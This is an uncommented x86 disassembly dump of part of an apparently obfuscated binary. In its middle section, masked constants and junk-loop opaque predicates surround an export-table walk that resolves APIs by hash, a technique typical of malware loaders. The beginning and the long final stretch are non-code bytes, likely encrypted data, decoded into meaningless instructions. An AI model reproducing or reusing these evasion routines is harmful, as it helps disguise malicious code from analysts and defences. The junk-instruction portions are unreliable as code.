  4060cf:	call   0xdceeba78
  4060d4:	ins    DWORD PTR es:[edi],dx
  4060d5:	xor    BYTE PTR [ecx],cl
  4060d7:	sub    eax,0x755924ea
  4060dc:	mov    esp,0x2a602617
  4060e1:	dec    edi
  4060e2:	mov    ebx,0x14c8bbd8
  4060e7:	mov    edx,0x9b96659f
  4060ec:	pop    ds
  4060ed:	pop    edx
  4060ee:	pushf  
  4060ef:	add    ecx,DWORD PTR [edi+0x76]
  4060f2:	clc    
  4060f3:	inc    esi
  4060f4:	call   0x9975:0xf1340eef
  4060fb:	loopne 0x40610c
  4060fd:	in     al,dx
  4060fe:	jo     0x406133
  406100:	pop    ds
  406101:	lea    edx,[eax+ebp*4-0x77a52749]
  406108:	add    al,0x1a
  40610a:	mov    eax,DWORD PTR [ebp-0x40]
  40610d:	mov    edx,DWORD PTR [ebp-0x28]
  406110:	xor    eax,esi
  406112:	xor    edx,esi
  406114:	add    eax,edi
  406116:	add    edx,edi
  406118:	imul   eax,edx
  40611b:	add    eax,DWORD PTR [ebp-0xc]
  40611e:	mov    DWORD PTR [ebp-0xc],eax
  406121:	mov    eax,DWORD PTR [ebp-0xc]
  406124:	mov    edx,DWORD PTR [ebp-0x18]
  406127:	cmp    edx,eax
  406129:	jb     0x403ce7
  40612f:	mov    eax,DWORD PTR [ebp-0x28]
  406132:	mov    edx,DWORD PTR [ebp-0x18]
  406135:	xor    eax,esi
  406137:	add    eax,edi
  406139:	imul   eax,edx
  40613c:	mov    edx,DWORD PTR [ebp-0x1c]
  40613f:	xor    edx,esi
  406141:	add    edx,edi
  406143:	or     eax,edx
  406145:	mov    edx,DWORD PTR [ebp-0x20]
  406148:	xor    edx,esi
  40614a:	add    eax,edx
  40614c:	mov    edx,DWORD PTR [ebp-0x20]
  40614f:	xor    edx,esi
  406151:	add    eax,edx
  406153:	mov    edx,DWORD PTR [ebp-0x10]
  406156:	lea    eax,[eax+edx*1+0x64e5ea]
  40615d:	jmp    0x406171
  406162:	mov    eax,DWORD PTR [ebp-0x20]
  406165:	mov    edx,DWORD PTR [ebp-0x10]
  406168:	xor    eax,esi
  40616a:	lea    eax,[eax+edx*1+0x3272f5]
  406171:	mov    DWORD PTR [ebp-0x10],eax
  406174:	jmp    0x403c34
  406179:	mov    ebx,DWORD PTR [ebp-0x3c]
  40617c:	mov    eax,DWORD PTR [ebp+0xc]
  40617f:	xor    eax,esi
  406181:	lea    ecx,[ecx+eax*1+0x3272f5]
  406188:	lea    eax,[ecx-0x3272f5]
  40618e:	xor    eax,esi
  406190:	cmp    eax,0xf89c95a5
  406195:	jne    0x401883
  40619b:	dec    DWORD PTR [ebp-0x34]
  40619e:	jne    0x401877
  4061a4:	mov    eax,DWORD PTR [ebp+0x8]
  4061a7:	mov    ecx,DWORD PTR [ebp+0xc]
  4061aa:	mov    edx,DWORD PTR [ebp+0x8]
  4061ad:	xor    ecx,esi
  4061af:	mov    cl,BYTE PTR [ecx+ebx*1+0x3272f5]
  4061b6:	xor    eax,esi
  4061b8:	mov    al,BYTE PTR [eax+ebx*1+0x3272f5]
  4061bf:	xor    edx,esi
  4061c1:	mov    BYTE PTR [edx+ebx*1+0x3272f5],cl
  4061c8:	mov    ecx,DWORD PTR [ebp+0xc]
  4061cb:	xor    ecx,esi
  4061cd:	mov    BYTE PTR [ecx+ebx*1+0x3272f5],al
  4061d4:	mov    eax,DWORD PTR [ebp+0xc]
  4061d7:	xor    eax,esi
  4061d9:	add    eax,edi
  4061db:	pop    edi
  4061dc:	pop    esi
  4061dd:	pop    ebx
  4061de:	leave  
  4061df:	ret    0x8
  4061e2:	sbb    DWORD PTR ds:0x42b226,0x2deb
  4061ec:	xor    eax,eax
  4061ee:	sbb    DWORD PTR ds:0x42b1ce,0x42b18a
  4061f8:	inc    eax
  4061f9:	ret    
  4061fa:	push   ebp
  4061fb:	mov    ebp,esp
  4061fd:	sub    esp,0x38
  406200:	and    DWORD PTR ds:0x42b22a,0x0
  40620a:	mov    eax,ds:0x42b22a
  40620f:	inc    eax
  406210:	mov    ds:0x42b22a,eax
  406215:	cmp    DWORD PTR ds:0x42b22a,0x14
  40621c:	jbe    0x40624e
  406222:	jmp    0x406241
  406227:	push   0x42b216
  40622c:	push   0x1051
  406231:	push   0x42a251
  406236:	push   0x42a000
  40623b:	call   DWORD PTR ds:0x42b31e
  406241:	cmp    DWORD PTR ds:0x42b22a,0x12
  406248:	jb     0x40620a
  40624e:	mov    DWORD PTR [ebp-0x4],0xf89c85a5
  406255:	push   ebx
  406256:	mov    DWORD PTR [ebp-0xc],0xf89c85a2
  40625d:	mov    eax,DWORD PTR [ebp-0x4]
  406260:	push   esi
  406261:	and    DWORD PTR ds:0x42b22a,0x0
  40626b:	mov    esi,DWORD PTR ds:0x42b22a
  406271:	inc    esi
  406272:	mov    DWORD PTR ds:0x42b22a,esi
  406278:	cmp    DWORD PTR ds:0x42b22a,0x26
  40627f:	jbe    0x4062a0
  406285:	jmp    0x406293
  40628a:	push   DWORD PTR [ebp-0x1c]
  40628d:	call   DWORD PTR ds:0x42b322
  406293:	cmp    DWORD PTR ds:0x42b22a,0x16
  40629a:	jb     0x40626b
  4062a0:	mov    esi,0x75108ae
  4062a5:	or     DWORD PTR ds:0x42b1aa,0x42b19e
  4062af:	xor    eax,esi
  4062b1:	sub    DWORD PTR ds:0x42b1da,0x3dfa
  4062bb:	push   edi
  4062bc:	add    DWORD PTR ds:0x42b1ea,0x4970
  4062c6:	mov    edi,0x3272f5
  4062cb:	and    DWORD PTR ds:0x42b1ea,0x42b1d6
  4062d5:	add    eax,edi
  4062d7:	mov    DWORD PTR [ebp-0x1c],eax
  4062da:	mov    eax,DWORD PTR [ebp+0x14]
  4062dd:	add    DWORD PTR ds:0x42b22a,0x5e0e
  4062e7:	test   eax,eax
  4062e9:	je     0x40635d
  4062ef:	mov    DWORD PTR ds:0x42b1b6,0x13
  4062f9:	cmp    DWORD PTR ds:0x42b1b6,0x0
  406300:	je     0x40634f
  406306:	cmp    DWORD PTR ds:0x42b1b6,0x3
  40630d:	jle    0x40634f
  406313:	jmp    0x406323
  406318:	push   0x8d96
  40631d:	call   DWORD PTR ds:0x42b326
  406323:	cmp    DWORD PTR ds:0x42b1b6,0x4
  40632a:	jne    0x40633d
  406330:	mov    ebx,DWORD PTR ds:0x42b1b6
  406336:	dec    ebx
  406337:	mov    DWORD PTR ds:0x42b1b6,ebx
  40633d:	mov    ebx,DWORD PTR ds:0x42b1b6
  406343:	dec    ebx
  406344:	mov    DWORD PTR ds:0x42b1b6,ebx
  40634a:	jmp    0x4062f9
  40634f:	mov    eax,DWORD PTR [ebp+0x14]
  406352:	sbb    DWORD PTR ds:0x42b1ba,edx
  406358:	mov    eax,DWORD PTR [eax]
  40635a:	mov    DWORD PTR [ebp-0x1c],eax
  40635d:	and    ebx,DWORD PTR ds:0x42b1fa
  406363:	mov    eax,DWORD PTR [ebp-0x4]
  406366:	xor    eax,esi
  406368:	mov    DWORD PTR ds:0x42b22a,0x1f
  406372:	cmp    DWORD PTR ds:0x42b22a,0x0
  406379:	je     0x4063c1
  40637f:	cmp    DWORD PTR ds:0x42b22a,0x2a
  406386:	jg     0x4063c1
  40638c:	jmp    0x4063af
  406391:	push   0x42a061
  406396:	push   0x44b1
  40639b:	push   DWORD PTR [ebp-0x1c]
  40639e:	push   DWORD PTR [ebp-0x18]
  4063a1:	push   DWORD PTR [ebp-0x1c]
  4063a4:	push   0x7663
  4063a9:	call   DWORD PTR ds:0x42b2ea
  4063af:	mov    ebx,DWORD PTR ds:0x42b22a
  4063b5:	dec    ebx
  4063b6:	mov    DWORD PTR ds:0x42b22a,ebx
  4063bc:	jmp    0x406372
  4063c1:	add    eax,edi
  4063c3:	mov    DWORD PTR [ebp-0x8],eax
  4063c6:	sub    eax,eax
  4063c8:	mov    eax,DWORD PTR [ebp-0xc]
  4063cb:	add    DWORD PTR ds:0x42b196,ecx
  4063d1:	xor    eax,esi
  4063d3:	adc    ebx,DWORD PTR ds:0x42b1aa
  4063d9:	add    eax,edi
  4063db:	add    ebx,DWORD PTR ds:0x42b186
  4063e1:	mov    DWORD PTR [ebp-0x24],eax
  4063e4:	mov    eax,DWORD PTR [ebp-0x4]
  4063e7:	add    ebx,DWORD PTR ds:0x42b1ba
  4063ed:	xor    eax,esi
  4063ef:	and    DWORD PTR ds:0x42b19e,0x0
  4063f9:	jmp    0x40640b
  4063fe:	mov    ebx,DWORD PTR ds:0x42b19e
  406404:	inc    ebx
  406405:	mov    DWORD PTR ds:0x42b19e,ebx
  40640b:	cmp    DWORD PTR ds:0x42b19e,0x1e
  406412:	jae    0x406444
  406418:	cmp    DWORD PTR ds:0x42b19e,0x27
  40641f:	ja     0x406444
  406425:	jmp    0x40643f
  40642a:	push   0x42a061
  40642f:	push   DWORD PTR [ebp-0x20]
  406432:	push   0x0
  406434:	push   0x6ce9
  406439:	call   DWORD PTR ds:0x42b2ee
  40643f:	jmp    0x4063fe
  406444:	add    eax,edi
  406446:	mov    DWORD PTR [ebp-0x30],eax
  406449:	movzx  ebx,BYTE PTR ds:0x42b22e
  406450:	add    ebx,DWORD PTR ds:0x42b1c6
  406456:	mov    DWORD PTR ds:0x42b22e,ebx
  40645c:	mov    ebx,DWORD PTR [ebp-0x4]
  40645f:	xor    ebx,esi
  406461:	mov    eax,ds:0x42b1da
  406466:	or     DWORD PTR ds:0x42b1ee,eax
  40646c:	add    ebx,edi
  40646e:	and    DWORD PTR ds:0x42b1b2,0x0
  406478:	mov    eax,ds:0x42b1b2
  40647d:	inc    eax
  40647e:	mov    ds:0x42b1b2,eax
  406483:	cmp    DWORD PTR ds:0x42b1b2,0x1f
  40648a:	jg     0x4064ab
  406490:	jmp    0x40649e
  406495:	push   DWORD PTR [ebp-0x1c]
  406498:	call   DWORD PTR ds:0x42b2f2
  40649e:	cmp    DWORD PTR ds:0x42b1b2,0x17
  4064a5:	jb     0x406478
  4064ab:	mov    eax,DWORD PTR [ebp-0x24]
  4064ae:	and    DWORD PTR ds:0x42b1e2,0x6649
  4064b8:	sub    eax,edi
  4064ba:	sub    DWORD PTR ds:0x42b22e,0x1376
  4064c4:	lea    ecx,[ebx-0x3272f5]
  4064ca:	xor    DWORD PTR ds:0x42b212,0x3b15
  4064d4:	xor    eax,esi
  4064d6:	adc    DWORD PTR ds:0x42b216,0x7bbc
  4064e0:	xor    ecx,esi
  4064e2:	cmp    ecx,eax
  4064e4:	je     0x40678a
  4064ea:	mov    eax,ds:0x42b18a
  4064ef:	sbb    eax,DWORD PTR ds:0x42b192
  4064f5:	mov    ds:0x42b18a,eax
  4064fa:	mov    eax,DWORD PTR [ebp-0x4]
  4064fd:	xor    eax,esi
  4064ff:	add    eax,edi
  406501:	mov    DWORD PTR ds:0x42b21e,0x72e1
  40650b:	cmp    ebx,eax
  40650d:	mov    DWORD PTR ds:0x42b202,0xd47
  406517:	jne    0x406767
  40651d:	xor    DWORD PTR ds:0x42b1f2,0x42b1b6
  406527:	push   DWORD PTR [ebp+0x8]
  40652a:	call   0x424022
  40652f:	xor    DWORD PTR ds:0x42b1b2,edx
  406535:	mov    DWORD PTR [ebp-0x14],eax
  406538:	mov    ecx,DWORD PTR ds:0x42b296
  40653e:	mov    ecx,DWORD PTR [ecx]
  406540:	sbb    DWORD PTR ds:0x42b1f6,ecx
  406546:	mov    eax,DWORD PTR [ebp-0x4]
  406549:	sbb    DWORD PTR ds:0x42b1d6,ecx
  40654f:	mov    ecx,DWORD PTR [ebp-0x14]
  406552:	xor    eax,esi
  406554:	add    eax,edi
  406556:	mov    DWORD PTR ds:0x42b226,0x75db
  406560:	cmp    ecx,eax
  406562:	je     0x4067f5
  406568:	push   DWORD PTR [ebp-0x14]
  40656b:	push   DWORD PTR [ebp+0x8]
  40656e:	mov    DWORD PTR ds:0x42b196,0x32ca
  406578:	call   0x424138
  40657d:	mov    DWORD PTR [ebp-0x14],eax
  406580:	adc    DWORD PTR ds:0x42b18a,ecx
  406586:	mov    eax,DWORD PTR [ebp-0x4]
  406589:	adc    DWORD PTR ds:0x42b186,ecx
  40658f:	mov    ecx,DWORD PTR [ebp-0x14]
  406592:	sub    DWORD PTR ds:0x42b1e6,0x42b196
  40659c:	xor    eax,esi
  40659e:	adc    DWORD PTR ds:0x42b212,0x42b1f6
  4065a8:	add    eax,edi
  4065aa:	cmp    ecx,eax
  4065ac:	mov    DWORD PTR ds:0x42b1da,0x7670
  4065b6:	je     0x4067f5
  4065bc:	xor    eax,eax
  4065be:	add    eax,DWORD PTR ds:0x42b19a
  4065c4:	and    eax,DWORD PTR ds:0x42b1be
  4065ca:	mov    ds:0x42b19a,eax
  4065cf:	mov    eax,DWORD PTR [ebp-0x14]
  4065d2:	mov    eax,DWORD PTR [eax+0x18]
  4065d5:	and    DWORD PTR ds:0x42b1e2,0x0
  4065df:	jmp    0x4065f1
  4065e4:	mov    ecx,DWORD PTR ds:0x42b1e2
  4065ea:	inc    ecx
  4065eb:	mov    DWORD PTR ds:0x42b1e2,ecx
  4065f1:	cmp    DWORD PTR ds:0x42b1e2,0x13
  4065f8:	jae    0x40663a
  4065fe:	cmp    DWORD PTR ds:0x42b1e2,0x9
  406605:	jb     0x40663a
  40660b:	jmp    0x40661b
  406610:	push   0x42b206
  406615:	call   DWORD PTR ds:0x42b2f6
  40661b:	cmp    DWORD PTR ds:0x42b1e2,0x8
  406622:	jne    0x406635
  406628:	mov    ecx,DWORD PTR ds:0x42b1e2
  40662e:	inc    ecx
  40662f:	mov    DWORD PTR ds:0x42b1e2,ecx
  406635:	jmp    0x4065e4
  40663a:	mov    DWORD PTR [ebp-0x24],eax
  40663d:	mov    eax,DWORD PTR [ebp-0x14]
  406640:	mov    ecx,DWORD PTR ds:0x42b1c2
  406646:	adc    ecx,DWORD PTR ds:0x42b1b2
  40664c:	mov    DWORD PTR ds:0x42b1c2,ecx
  406652:	mov    ecx,DWORD PTR [ebp+0x8]
  406655:	or     DWORD PTR ds:0x42b1f6,0x7077
  40665f:	add    ecx,DWORD PTR [eax+0x20]
  406662:	and    eax,0x7368
  406667:	mov    DWORD PTR [ebp-0x2c],ecx
  40666a:	mov    eax,DWORD PTR [ebp-0x14]
  40666d:	and    DWORD PTR ds:0x42b21a,0x0
  406677:	jmp    0x40668b
  40667c:	xor    ecx,ecx
  40667e:	or     ecx,DWORD PTR ds:0x42b21a
  406684:	inc    ecx
  406685:	mov    DWORD PTR ds:0x42b21a,ecx
  40668b:	cmp    DWORD PTR ds:0x42b21a,0x1c
  406692:	jae    0x4066e3
  406698:	cmp    DWORD PTR ds:0x42b21a,0x5
  40669f:	jbe    0x4066e3
  4066a5:	jmp    0x4066c4
  4066aa:	push   0x42b1f6
  4066af:	push   0x42b18e
  4066b4:	push   0x52aa
  4066b9:	push   0x42a0fe
  4066be:	call   DWORD PTR ds:0x42b2fa
  4066c4:	cmp    DWORD PTR ds:0x42b21a,0x4
  4066cb:	jne    0x4066de
  4066d1:	mov    ecx,DWORD PTR ds:0x42b21a
  4066d7:	inc    ecx
  4066d8:	mov    DWORD PTR ds:0x42b21a,ecx
  4066de:	jmp    0x40667c
  4066e3:	mov    ecx,DWORD PTR [ebp+0x8]
  4066e6:	add    ecx,DWORD PTR [eax+0x24]
  4066e9:	mov    DWORD PTR [ebp-0x34],ecx
  4066ec:	adc    DWORD PTR ds:0x42b212,0x34a6
  4066f6:	mov    eax,DWORD PTR [ebp-0x14]
  4066f9:	and    DWORD PTR ds:0x42b192,0x0
  406703:	mov    ecx,DWORD PTR ds:0x42b192
  406709:	inc    ecx
  40670a:	mov    DWORD PTR ds:0x42b192,ecx
  406710:	cmp    DWORD PTR ds:0x42b192,0x4
  406717:	jbe    0x406759
  40671d:	jmp    0x406732
  406722:	push   0x42b1b6
  406727:	push   0x42a2a1
  40672c:	call   DWORD PTR ds:0x42b2fe
  406732:	cmp    DWORD PTR ds:0x42b192,0x3
  406739:	jne    0x40674c
  40673f:	mov    ecx,DWORD PTR ds:0x42b192
  406745:	inc    ecx
  406746:	mov    DWORD PTR ds:0x42b192,ecx
  40674c:	cmp    DWORD PTR ds:0x42b192,0x13
  406753:	jb     0x406703
  406759:	mov    ecx,DWORD PTR [ebp+0x8]
  40675c:	add    ecx,DWORD PTR [eax+0x1c]
  40675f:	mov    DWORD PTR [ebp-0x14],ecx
  406762:	jmp    0x4067bd
  406767:	mov    eax,DWORD PTR [ebp-0x2c]
  40676a:	mov    ecx,DWORD PTR [ebp+0x8]
  40676d:	add    ecx,DWORD PTR [eax+ebx*4]
  406770:	mov    DWORD PTR [ebp-0x28],ecx
  406773:	mov    eax,DWORD PTR [ebp-0x4]
  406776:	mov    ecx,DWORD PTR [ebp-0x28]
  406779:	xor    eax,esi
  40677b:	add    eax,edi
  40677d:	cmp    ecx,eax
  40677f:	je     0x4067bd
  406785:	jmp    0x4067ae
  40678a:	mov    eax,DWORD PTR [ebp-0x4]
  40678d:	mov    ecx,DWORD PTR [ebp-0x8]
  406790:	xor    eax,esi
  406792:	add    eax,edi
  406794:	cmp    ecx,eax
  406796:	mov    eax,DWORD PTR [ebp-0x4]
  406799:	je     0x4067f8
  40679f:	mov    ecx,DWORD PTR [ebp-0x30]
  4067a2:	xor    eax,esi
  4067a4:	add    eax,edi
  4067a6:	cmp    ecx,eax
  4067a8:	je     0x406801
  4067ae:	lea    eax,[ebp-0x8]
  4067b1:	push   eax
  4067b2:	push   DWORD PTR [ebp-0x28]
  4067b5:	push   DWORD PTR [ebp+0xc]
  4067b8:	call   0x40f847
  4067bd:	mov    eax,DWORD PTR [ebp-0x4]
  4067c0:	mov    ecx,DWORD PTR [ebp-0x8]
  4067c3:	xor    eax,esi
  4067c5:	add    eax,edi
  4067c7:	cmp    ecx,eax
  4067c9:	je     0x4067e4
  4067cf:	mov    eax,DWORD PTR [ebp-0x34]
  4067d2:	movzx  eax,WORD PTR [eax+ebx*2]
  4067d6:	mov    ecx,DWORD PTR [ebp-0x14]
  4067d9:	mov    eax,DWORD PTR [ecx+eax*4]
  4067dc:	mov    DWORD PTR [ebp-0x38],eax
  4067df:	jmp    0x40678a
  4067e4:	mov    eax,DWORD PTR [ebp-0xc]
  4067e7:	xor    eax,esi
  4067e9:	lea    ebx,[ebx+eax*1+0x3272f5]
  4067f0:	jmp    0x40646e
  4067f5:	mov    eax,DWORD PTR [ebp-0x4]
  4067f8:	xor    eax,esi
  4067fa:	add    eax,edi
  4067fc:	jmp    0x40f768
  406801:	mov    eax,DWORD PTR [ebp-0x38]
  406804:	add    eax,DWORD PTR [ebp+0x8]
  406807:	mov    DWORD PTR [ebp-0x18],eax
  40680a:	mov    eax,DWORD PTR [ebp-0x1c]
  40680d:	test   eax,eax
  40680f:	je     0x40afcd
  406815:	mov    DWORD PTR [ebp-0x20],0x0
  40681c:	push   0x3
  40681e:	xor    edx,edx
  406820:	pop    edx
  406821:	add    edx,0x8
  406824:	push   edx
  406825:	pop    ecx
  406826:	push   0x6
  406828:	dec    ecx
  406829:	pop    ebx
  40682a:	dec    ebx
  40682b:	xchg   ebx,ecx
  40682d:	sub    ebx,ecx
  40682f:	xchg   ebx,ecx
  406831:	dec    ecx
  406832:	mov    eax,DWORD PTR [ebp-0x1c]
  406835:	imul   eax,ecx
  406838:	sub    esp,eax
  40683a:	mov    DWORD PTR [ebp-0x20],esp
  40683d:	mov    eax,DWORD PTR [ebp-0x4]
  406840:	xor    eax,esi
  406842:	add    eax,edi
  406844:	jmp    0x408c14
  406849:	mov    ecx,DWORD PTR [ebp-0xc]
  40684c:	mov    eax,DWORD PTR [ebp+0x8]
  40684f:	mov    edx,DWORD PTR [ebp+0x14]
  406852:	mov    eax,DWORD PTR [edx+eax*4+0x4]
  406856:	xor    ecx,esi
  406858:	add    ecx,edi
  40685a:	xor    edx,edx
  40685c:	div    ecx
  40685e:	mov    ecx,DWORD PTR [ebp-0x4]
  406861:	xor    ecx,esi
  406863:	lea    eax,[ecx+eax*1+0x3272f5]
  40686a:	mov    ecx,DWORD PTR [ebp+0x8]
  40686d:	mov    edx,DWORD PTR [ebp-0x20]
  406870:	mov    DWORD PTR [edx+ecx*4],eax
  406873:	mov    eax,DWORD PTR [ebp-0xc]
  406876:	mov    ecx,DWORD PTR [ebp+0x8]
  406879:	xor    eax,esi
  40687b:	jmp    0x408c0d
  406880:	mov    ebx,0x2cc0cea
  406885:	mov    bh,BYTE PTR [ebx-0x264bb77e]
  40688b:	pop    esi
  40688c:	jle    0x40686b
  40688e:	cmp    dl,BYTE PTR [ecx+0x13]
  406891:	cmp    eax,0x5e0c8383
  406896:	add    DWORD PTR [ebx+0x6460379c],0xfffffff3
  40689d:	xchg   ecx,eax
  40689e:	xchg   ecx,eax
  40689f:	sti    
  4068a0:	pop    ss
  4068a1:	enter  0xc054,0x44
  4068a5:	test   BYTE PTR [eax+0x3873850e],bl
  4068ab:	imul   edx,DWORD PTR [edx],0x43
  4068ae:	push   ss
  4068af:	imul   esi,DWORD PTR [esi+0x706a2bce],0xc
  4068b6:	cmp    ch,BYTE PTR [esi+0x1]
  4068b9:	mov    ds:0x2bb10586,al
  4068be:	mov    al,ds:0x1fb78298
  4068c3:	jne    0x4068a4
  4068c5:	out    dx,eax
  4068c6:	cmp    BYTE PTR [ecx],dl
  4068c8:	jae    0x406930
  4068ca:	push   ebp
  4068cb:	retf   0x7012
  4068ce:	lods   al,BYTE PTR ds:[esi]
  4068cf:	push   edx
  4068d0:	sbb    BYTE PTR [edx+ebp*2+0x4d],dh
  4068d4:	inc    esp
  4068d5:	xchg   edx,eax
  4068d6:	push   DWORD PTR [esi-0xc]
  4068d9:	cmp    esi,esp
  4068db:	xor    eax,0x76260c20
  4068e0:	xor    bh,BYTE PTR [edi+0x55]
  4068e3:	cld    
  4068e4:	popf   
  4068e5:	mov    dh,0xcb
  4068e7:	in     eax,0x31
  4068e9:	jns    0x406897
  4068eb:	rol    BYTE PTR [edx+0x5562069c],cl
  4068f1:	jmp    0x96dc:0x546dc093
  4068f8:	sub    eax,0xd51c668
  4068fd:	shr    bh,0xc0
  406900:	dec    ebx
  406901:	jnp    0x406897
  406903:	mov    eax,ds:0xf71caf12
  406908:	lods   eax,DWORD PTR ds:[esi]
  40690a:	xchg   ebp,eax
  40690b:	data16 mov cl,0x38
  40690e:	ja     0x406921
  406910:	test   eax,0x7ff64b6
  406915:	jo     0x4068a7
  406917:	and    eax,0x47bfca9c
  40691c:	adc    eax,0xd57aa6c5
  406921:	jbe    0x4068b0
  406923:	pop    ss
  406924:	je     0x406975
  406926:	scas   eax,DWORD PTR es:[edi]
  406927:	clc    
  406928:	loop   0x4068aa
  40692a:	repnz push DWORD PTR [edx]
  40692d:	test   BYTE PTR [esi-0x1f21eecd],dl
  406933:	xor    al,0xf5
  406935:	das    
  406936:	adc    al,BYTE PTR [ebp+0x6e]
  406939:	pop    ebp
  40693a:	mov    al,ds:0xdb10edf9
  40693f:	or     dl,BYTE PTR [edi-0x69cf8ab7]
  406945:	data16 loop 0x4069c2
  406948:	sub    eax,0x3de29cd8
  40694d:	push   ebx
  40694e:	(bad)  
  40694f:	fs cmp esp,edi
  406952:	cld    
  406953:	retf   
  406954:	imul   esp,DWORD PTR [ebx],0x42
  406957:	cmovle ebx,DWORD PTR [esi]
  40695a:	xchg   ecx,eax
  40695b:	loop   0x40697d
  40695d:	jnp    0x406930
  40695f:	push   0xffffffd8
  406961:	or     eax,0x8aefb5bf
  406966:	popf   
  406967:	mov    DWORD PTR [ecx+0x1e],esp
  40696a:	icebp  
  40696b:	sbb    al,0xb3
  40696d:	jle    0x40697e
  40696f:	imul   ebx,DWORD PTR [esi-0x289aea68],0xffffffb5
  406976:	sti    
  406977:	jge    0x406900
  406979:	adc    edi,DWORD PTR ds:0x345a2b9e
  40697f:	stos   DWORD PTR es:[edi],eax
  406980:	adc    bh,BYTE PTR [esi-0x3d]
  406983:	mov    esi,0xf82ffe41
  406988:	ins    BYTE PTR es:[edi],dx
  406989:	das    
  40698a:	add    BYTE PTR [ebx+eax*1+0x73],al
  40698e:	ret    
  40698f:	aad    0x4c
  406991:	ror    DWORD PTR [edi],cl
  406993:	jecxz  0x4069af
  406995:	adc    al,0xe8
  406997:	inc    esp
  406998:	jp     0x4069d7
  40699a:	dec    esi
  40699b:	mov    eax,ds:0xdfeffc2
  4069a0:	out    dx,al
  4069a1:	sbb    eax,0x29c37ca4
  4069a6:	in     al,0x72
  4069a8:	cld    
  4069a9:	rcr    DWORD PTR [edx+0x180465f6],0x67
  4069b0:	sbb    DWORD PTR [edx+edx*8+0x44bd7e73],eax
  4069b7:	mov    esi,0x6765cb0d
  4069bc:	cli    
  4069bd:	retf   0x8657
  4069c0:	sbb    edx,DWORD PTR [edx+0x80916bc]
  4069c6:	(bad)  
  4069c8:	popa   
  4069c9:	mov    al,ds:0x3c1b4a5d
  4069ce:	dec    ebx
  4069cf:	or     al,0x80
  4069d1:	aaa    
  4069d2:	xor    DWORD PTR [esi],edx
  4069d4:	mov    cl,0x6a
  4069d6:	or     ebp,esi
  4069d8:	inc    ebp
  4069d9:	outs   dx,BYTE PTR ds:[esi]
  4069da:	outs   dx,DWORD PTR ds:[esi]
  4069db:	dec    eax
  4069dc:	and    eax,0xb9c9814e
  4069e1:	lock xchg esi,eax
  4069e3:	cmp    eax,0x917139c0
  4069e8:	cmp    eax,edx
  4069ea:	and    bh,BYTE PTR [edx-0x18ca9e90]
  4069f0:	loop   0x4069d0
  4069f2:	jl     0x406a4c
  4069f4:	and    DWORD PTR [esi+0x75],ebx
  4069f7:	mov    dh,0xe9
  4069f9:	sbb    BYTE PTR [esi+ecx*1],cl
  4069fc:	ja     0x406a3c
  4069fe:	repz repz in al,0x89
  406a02:	push   edx
  406a03:	sub    DWORD PTR [ebx+0x5],eax
  406a06:	pop    ss
  406a07:	cmp    BYTE PTR [ebp-0x3e20cec],ah
  406a0d:	inc    edx
  406a0e:	fld    TBYTE PTR [edi]
  406a10:	aaa    
  406a11:	push   ds
  406a12:	and    al,0x91
  406a14:	and    al,0x4b
  406a16:	shl    BYTE PTR [ebx-0x3c],0x4d
  406a1a:	inc    ebp
  406a1b:	leave  
  406a1c:	cmp    eax,0xca774cb0
  406a21:	js     0x406a58
  406a23:	inc    ebx
  406a24:	pop    ebp
  406a25:	cld    
  406a26:	dec    ah
  406a28:	es call 0xb252657f
  406a2e:	add    eax,DWORD PTR [ebx+0x59]
  406a31:	and    BYTE PTR [ebp+0x2c],cl
  406a34:	imul   esp,DWORD PTR [edx*1+0x7272de04],0x22
  406a3c:	mov    ebx,0x7e584940
  406a41:	xor    BYTE PTR [ecx+0x7d680ad4],ah
  406a47:	jmp    0x981:0xacc7a4f1
  406a4e:	call   0x8558:0xe4b73fa
  406a55:	adc    DWORD PTR [edx-0x12],0x9a80de5d
  406a5c:	adc    al,0xe4
  406a5e:	arpl   WORD PTR [edi+0x51],bx
  406a61:	and    ebx,eax
  406a63:	or     eax,0x92195272
  406a68:	jae    0x406ada
  406a6a:	lea    ebx,[ecx-0x33]
  406a6d:	mov    eax,0x920c464d
  406a72:	lods   al,BYTE PTR ds:[esi]
  406a73:	mulps  xmm4,xmm1
  406a76:	jae    0x406ab4
  406a78:	(bad)  
  406a79:	pop    edx
  406a7a:	lock jne 0x406a74
  406a7d:	lock or BYTE PTR [edi+0x5ff8e286],dl
  406a84:	mov    al,ds:0xe8ef8e7c
  406a89:	(bad)
  406a8c:	dec    edi
  406a8d:	sub    esp,DWORD PTR [edx]
  406a8f:	sbb    ebp,DWORD PTR [edi+0x48f8b60f]
  406a95:	sub    DWORD PTR [esi-0x22],ecx
  406a98:	jnp    0x406afb
  406a9a:	dec    DWORD PTR [esi-0x75c7e0a1]
  406aa0:	bound  esi,QWORD PTR [ebx+0x1e3f2093]
  406aa6:	cmp    ebp,ebx
  406aa8:	fisttp DWORD PTR ds:0x1ab3d9f
  406aae:	xchg   ebx,eax
  406aaf:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  406ab0:	cli    
  406ab1:	xchg   esp,eax
  406ab2:	push   ds
  406ab3:	fsubr  QWORD PTR [ecx+0x70]
  406ab6:	imul   DWORD PTR [ebx-0x16b5474]
  406abc:	sti    
  406abd:	inc    bh
  406abf:	scas   eax,DWORD PTR es:[edi]
  406ac0:	sahf   
  406ac1:	daa    
  406ac2:	and    dl,BYTE PTR [edx+0x18]
  406ac5:	ins    BYTE PTR es:[edi],dx
  406ac6:	test   DWORD PTR [edi-0x267f8bdf],esp
  406acc:	in     al,0x3
  406ace:	test   al,0xb2
  406ad0:	cs dec eax
  406ad2:	imul   DWORD PTR [esi+0x1201ca86]
  406ad8:	inc    esi
  406ad9:	mov    ah,0xda
  406adb:	sub    DWORD PTR [edx+0x49e71f8f],0xffffff9b
  406ae2:	mov    ebx,DWORD PTR [ecx+0x12d92456]
  406ae8:	jle    0x406ac3
  406aea:	lods   eax,DWORD PTR ds:[esi]
  406aeb:	push   ds
  406aec:	xor    DWORD PTR [edi+eax*1+0x2c79839c],edx
  406af3:	mov    esp,0xbddf29b2
  406af8:	into   
  406af9:	xchg   ebx,eax
  406afa:	pop    ss
  406afb:	xchg   esi,eax
  406afc:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  406afd:	push   ebx
  406afe:	in     eax,0xba
  406b00:	mov    ecx,0x9cb39d1c
  406b05:	es out 0xa5,al
  406b08:	cmp    bh,BYTE PTR [esi]
  406b0a:	or     cl,BYTE PTR [edi+0x18]
  406b0d:	cmp    eax,0x13c016bc
  406b12:	adc    al,0x95
  406b14:	add    al,0xe1
  406b16:	pop    ebx
  406b17:	inc    esi
  406b18:	shl    BYTE PTR [edi],1
  406b1a:	sahf   
